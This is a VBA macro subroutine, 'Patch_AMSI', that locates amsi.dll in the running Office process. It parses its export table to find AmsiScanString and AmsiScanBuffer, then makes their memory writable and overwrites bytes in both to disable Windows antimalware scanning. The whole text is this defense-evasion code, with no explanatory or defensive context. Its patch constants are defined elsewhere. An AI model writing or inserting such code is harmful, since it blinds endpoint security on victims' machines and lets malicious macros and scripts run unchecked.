Sub Patch_AMSI()
    Dim hProcess As LongPtr: hProcess = -1
    Dim lpNumberOfBytesRead As LongPtr
    Dim Ldr_Data_Table_Entry_BaseDllAdr As LongPtr
    Dim IMAGE_DOS_HEADERS As LongPtr
    Dim e_lfanew As Long
    Dim IMAGE_NT_HEADERS As LongPtr
    Dim IMAGE_OPTIONAL_HEADERS As LongPtr
    Dim IMAGE_DATA_DIRECTORY As LongPtr
    Dim IMAGE_EXPORT_DIRECTORY_VirtualAddress As Long
    Dim IMAGE_EXPORT_DIRECTORY As LongPtr
    Dim IMAGE_EXPORT_DIRECTORY_Adr_of_Functions As LongPtr
    Dim IMAGE_EXPORT_DIRECTORY_FunctionStart As Long
    Dim IMAGE_EXPORT_DIRECTORY_FunctionStartAdr As LongPtr
    Dim fpAmsiScanString As LongPtr
    Dim fpAmsiScanBuffer As LongPtr
    Dim dwFuncRVA As Long
    Dim lpPatchAddress As LongPtr
    
    Ldr_Data_Table_Entry_BaseDllAdr = m_GetModuleHandle("amsi.dll")
    If Ldr_Data_Table_Entry_BaseDllAdr = 0 Then
        Exit Sub
    End If
    IMAGE_DOS_HEADERS = Ldr_Data_Table_Entry_BaseDllAdr
    m_ReadProcessMemory hProcess, ByVal (IMAGE_DOS_HEADERS + Offset_e_lfanew), VarPtr(e_lfanew), Len(e_lfanew), lpNumberOfBytesRead
    IMAGE_NT_HEADERS = Ldr_Data_Table_Entry_BaseDllAdr + e_lfanew
    IMAGE_OPTIONAL_HEADERS = IMAGE_NT_HEADERS + Offset_OptionalHeader
    IMAGE_DATA_DIRECTORY = IMAGE_OPTIONAL_HEADERS + Offset_DataDirectory
    m_ReadProcessMemory hProcess, ByVal (IMAGE_DATA_DIRECTORY + Offset_IMAGE_EXPORT_DIRECTORY_VirtualAddress), VarPtr(IMAGE_EXPORT_DIRECTORY_VirtualAddress), Len(IMAGE_EXPORT_DIRECTORY_VirtualAddress), lpNumberOfBytesRead
    IMAGE_EXPORT_DIRECTORY = Ldr_Data_Table_Entry_BaseDllAdr + IMAGE_EXPORT_DIRECTORY_VirtualAddress
    IMAGE_EXPORT_DIRECTORY_Adr_of_Functions = (IMAGE_EXPORT_DIRECTORY + Offset_IMAGE_EXPORT_DIRECTORY_Adr_of_Functions)
    m_ReadProcessMemory hProcess, ByVal (IMAGE_EXPORT_DIRECTORY_Adr_of_Functions), VarPtr(IMAGE_EXPORT_DIRECTORY_FunctionStart), Len(IMAGE_EXPORT_DIRECTORY_FunctionStart), lpNumberOfBytesRead
    IMAGE_EXPORT_DIRECTORY_FunctionStartAdr = Ldr_Data_Table_Entry_BaseDllAdr + IMAGE_EXPORT_DIRECTORY_FunctionStart
    
    m_ReadProcessMemory hProcess, ByVal (IMAGE_EXPORT_DIRECTORY_FunctionStartAdr + Offset_fpAmsiScanBuffer), VarPtr(dwFuncRVA), Len(dwFuncRVA), lpNumberOfBytesRead
    fpAmsiScanBuffer = Ldr_Data_Table_Entry_BaseDllAdr + dwFuncRVA
    m_ReadProcessMemory hProcess, ByVal (IMAGE_EXPORT_DIRECTORY_FunctionStartAdr + Offset_fpAmsiScanString), VarPtr(dwFuncRVA), Len(dwFuncRVA), lpNumberOfBytesRead
    fpAmsiScanString = Ldr_Data_Table_Entry_BaseDllAdr + dwFuncRVA
    
    lpPatchAddress = fpAmsiScanString + AmsiScanString_PatchByte_Offset
    m_VirtualProtect ByVal lpPatchAddress, 1, 64, 0
    m_RtlFillMemory ByVal (lpPatchAddress), 1, AmsiScanString_PatchByte_1
    lpPatchAddress = lpPatchAddress + 1
    m_VirtualProtect ByVal lpPatchAddress, 1, 64, 0
    m_RtlFillMemory ByVal (lpPatchAddress), 1, AmsiScanString_PatchByte_2
            
    lpPatchAddress = fpAmsiScanBuffer + AmsiScanBuffer_PatchByte_Offset
    m_VirtualProtect ByVal lpPatchAddress, 1, 64, 0
    m_RtlFillMemory ByVal (lpPatchAddress), 1, AmsiScanBuffer_PatchByte_1
    lpPatchAddress = lpPatchAddress + 1
    m_VirtualProtect ByVal lpPatchAddress, 1, 64, 0
    m_RtlFillMemory ByVal (lpPatchAddress), 1, AmsiScanBuffer_PatchByte_2
    lpPatchAddress = lpPatchAddress + 1
    m_VirtualProtect ByVal lpPatchAddress, 1, 64, 0
    m_RtlFillMemory ByVal (lpPatchAddress), 1, AmsiScanBuffer_PatchByte_3
    lpPatchAddress = lpPatchAddress + 1
    m_VirtualProtect ByVal lpPatchAddress, 1, 64, 0
    m_RtlFillMemory ByVal (lpPatchAddress), 1, AmsiScanBuffer_PatchByte_4
    lpPatchAddress = lpPatchAddress + 1
    m_VirtualProtect ByVal lpPatchAddress, 1, 64, 0
    m_RtlFillMemory ByVal (lpPatchAddress), 1, AmsiScanBuffer_PatchByte_5

End Sub

